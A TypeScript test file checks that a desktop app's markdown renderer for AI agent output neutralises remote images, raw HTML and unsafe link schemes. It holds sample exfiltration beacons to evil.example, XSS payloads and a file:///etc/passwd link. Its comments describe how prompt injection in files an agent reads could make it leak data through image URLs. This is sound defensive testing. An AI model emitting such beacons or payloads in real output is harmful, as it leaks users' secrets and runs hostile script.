import { describe, it, expect, vi } from "vitest";

vi.mock("@tauri-apps/plugin-opener", () => ({ openUrl: vi.fn() }));
vi.mock("@tauri-apps/api/core", () => ({ invoke: vi.fn() }));
vi.mock("@tauri-apps/api/webviewWindow", () => ({
  getCurrentWebviewWindow: () => ({ listen: vi.fn(() => Promise.resolve(() => {})) }),
}));
vi.mock("@tauri-apps/plugin-updater", () => ({ check: vi.fn() }));
vi.mock("@tauri-apps/plugin-process", () => ({ relaunch: vi.fn() }));
vi.mock("@tauri-apps/plugin-dialog", () => ({ open: vi.fn() }));

import { renderToStaticMarkup } from "react-dom/server";
import React from "react";
import { MarkdownText } from "./App";

const render = (text: string) => renderToStaticMarkup(React.createElement(MarkdownText, { text }));

/// An `<img>` fetches its src the moment it renders — no click, no consent. So a
/// markdown image in agent output is a GET request the attacker chooses the URL of,
/// and the URL itself is the payload. The agent reads files for a living and a file
/// can carry a prompt injection, so this is the app's most reachable exfiltration
/// path, not a theoretical one.
///
/// The CSP's `img-src 'self'` also blocks it, deliberately — this is the second lock.
/// These tests exist so a refactor of MARKDOWN_OPTIONS can't quietly remove the first
/// one and leave a network-layer policy as the only thing standing there.
describe("markdown cannot emit a remote image", () => {
  const beacons = [
    "![](https://evil.example/?leak=secret)",
    "![alt](https://evil.example/beacon.png)",
    "![](//evil.example/protocol-relative.png)",
    "![](http://127.0.0.1:9/ping)",
    "![](HTTPS://EVIL.EXAMPLE/case.png)",
    "text before ![](https://evil.example/inline.png) text after",
    "![](https://evil.example/a.png)\n\n![](https://evil.example/b.png)",
  ];

  for (const md of beacons) {
    it(`no <img>, no host: ${JSON.stringify(md.slice(0, 42))}`, () => {
      const html = render(md);
      expect(html).not.toMatch(/<img/i);
      expect(html).not.toMatch(/evil\.example/i);
      expect(html).not.toMatch(/127\.0\.0\.1/);
    });
  }

  it("keeps the alt text, so the reader still knows something was there", () => {
    expect(render("![a diagram of the flow](https://evil.example/x.png)")).toContain(
      "a diagram of the flow",
    );
  });

  it("an image with no alt still renders inert, not blank", () => {
    const html = render("![](https://evil.example/x.png)");
    expect(html).toContain("md-dead-link");
    expect(html).not.toMatch(/<img/i);
  });
});

/// The control the CSP agent ran proved `disableParsingRawHTML` is load-bearing:
/// with it off, `<base href>` / `<form action>` / `<svg>` / `<link>` render live.
/// `<base>` is the worst — it silently repoints every relative URL in the app.
/// These pin the shipping config so the option can't be dropped in a cleanup.
describe("raw HTML in agent output never becomes live markup", () => {
  const hostile = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<base href='https://evil.example/'>",
    "<form action='https://evil.example/'><input name=x></form>",
    "<svg onload=alert(1)></svg>",
    "<link rel=stylesheet href='https://evil.example/x.css'>",
    "<iframe src='https://evil.example/'></iframe>",
    "<object data='https://evil.example/'></object>",
  ];

  for (const md of hostile) {
    it(`escapes: ${JSON.stringify(md.slice(0, 38))}`, () => {
      const html = render(md);
      // Assert on REAL tags only. `<img src=x onerror=alert(1)>` renders as
      // `<p>&lt;img src=x onerror=alert(1)&gt;</p>` — the substrings "onerror=" and
      // "alert(1)" are present and completely inert, because escaped text cannot
      // open a tag. A substring assertion here fails on safe output and would push
      // someone to "fix" code that is already correct.
      expect(html).not.toMatch(/<(script|base|form|svg|link|iframe|object|img)[\s>/]/i);
      // And prove it's escaped rather than dropped: the reader should still see it.
      expect(html).toContain("&lt;");
    });
  }

  it("a hostile string survives as readable text, not a silent deletion", () => {
    expect(render("<script>alert(1)</script>")).toContain("alert(1)");
  });
});

/// A link that navigates the webview replaces the app's own page with no back
/// button. Non-http(s) schemes never become an anchor at all: `openUrl` hands its
/// argument to the OS, which acts on schemes a browser would refuse.
describe("links", () => {
  it("http(s) becomes an anchor", () => {
    expect(render("[ok](https://example.com/x)")).toMatch(/<a[^>]+href="https:\/\/example\.com\/x"/);
  });

  for (const scheme of ["javascript:alert(1)", "data:text/html,<script>alert(1)</script>", "file:///etc/passwd"]) {
    it(`refuses to anchor ${scheme.split(":")[0]}:`, () => {
      const html = render(`[click](${scheme})`);
      expect(html).not.toMatch(/<a[^>]+href/i);
      expect(html).toContain("md-dead-link");
    });
  }
});
